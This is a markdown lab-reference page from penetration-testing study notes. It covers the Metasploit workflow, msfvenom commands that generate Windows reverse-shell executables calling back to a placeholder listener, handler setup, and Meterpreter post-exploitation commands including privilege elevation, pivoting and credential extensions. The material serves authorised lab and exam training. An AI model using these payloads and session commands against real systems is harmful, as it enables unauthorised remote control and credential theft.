# Metasploit and payload generation

[Home](../README.md) · [Shells](Shells.md) · [Transfers](File-Transfers.md)

These are technical lab references from the supplied notes. Tool and target restrictions for an exam must come from the current exam instructions.

## Framework workflow

**Kali / Bash:** `msfconsole`. **Inside msfconsole:**

```text
search type:exploit <PRODUCT>
info <MODULE>
use <MODULE>
show options
show targets
show payloads
set RHOSTS <IP>
set LHOST <LHOST>
set LPORT 4444
run
sessions
```

Read module prerequisites and side effects before running it. Exploit modules exercise vulnerabilities; auxiliary modules perform tasks such as scanning; post modules run after access. Encoders transform payload bytes but do not guarantee detection evasion. NOP modules generate architecture-specific padding.

## Database organization

Initialize the local database with `sudo msfdb init` where supported. Confirm PostgreSQL is running, then use `db_status` in msfconsole. `workspace -a <NAME>` creates a workspace; `db_nmap <OPTIONS> <IP>` imports scan results; `hosts` and `services` display them. A workspace separates records, not network scope or tool permissions.

## Staged and stageless payloads

**Kali / Bash:**

```bash
# Stageless Windows x64 command shell.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
# Staged Windows x64 command shell.
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o staged.exe
# A specific command payload, not a reverse shell.
msfvenom -p windows/exec CMD='whoami' -f exe -o command.exe
```

The underscore/slash names denote different payloads. A staged payload requires a handler that supplies the second stage. A Meterpreter payload requires a matching Meterpreter handler; plain `nc` does not implement it. Use the installed payload list to confirm names:

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

Bad-character exclusions such as `-b '\x00\x0a\x0d'` are specific to the input channel and architecture. Generate shellcode only after identifying those constraints. Use the ASCII hyphen in `-e`; several source commands contain an en dash that a CLI will reject.

## Matching handler

**msfconsole:**

```text
use exploit/multi/handler
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
run
```

Change `PAYLOAD` to the exact generated payload. Keep a copy of the generation command, payload hash, listener settings and target architecture.

## Meterpreter essentials

**Inside a Meterpreter session:**

```text
getuid
sysinfo
pwd
ls
upload <LOCAL_FILE> <REMOTE_PATH>
download <REMOTE_FILE> <LOCAL_PATH>
ipconfig
netstat
arp
background
```

`lcd` and other supported `l`-prefixed filesystem commands refer to the local machine. Use `help` for commands supported by the actual payload/platform. Channel listings and interaction expose individual process/file channels. `getsystem` attempts specific elevation techniques and can fail; it does not create a general right to SYSTEM. `migrate <PID>` also depends on access to a compatible process.

Meterpreter `portfwd` and framework routes support pivoting for compatible traffic. A framework route is not the OS routing table, and a local port forward is not a full subnet route.

## Console lifecycle and session records

Inside msfconsole, `spool <LOCAL_LOG>` records console output and `spool off` ends it; `jobs`, `jobs -k <ID>`, `sessions -i <ID>` and `sessions -k <ID>` manage the selected background jobs/sessions. `setg` sets a global option and `unsetg` removes it; stale global targets/callbacks can affect a later module. Use `resource <FILE>` only after reviewing every command in that local script.

Loot and auxiliary output commonly live beneath the framework user's `.msf4` directory, with exact paths printed by modules. Meterpreter extensions (for example Kiwi or Incognito) expose additional credential/token operations only when supported. Monitoring, screenshot, keyscan and file-timestamp operations have separate prerequisites and side effects; they are not needed merely to prove a shell. Record the original artifact metadata if a deliberate lab exercise changes it. Close only sessions/jobs you identify, and retain required evidence first.
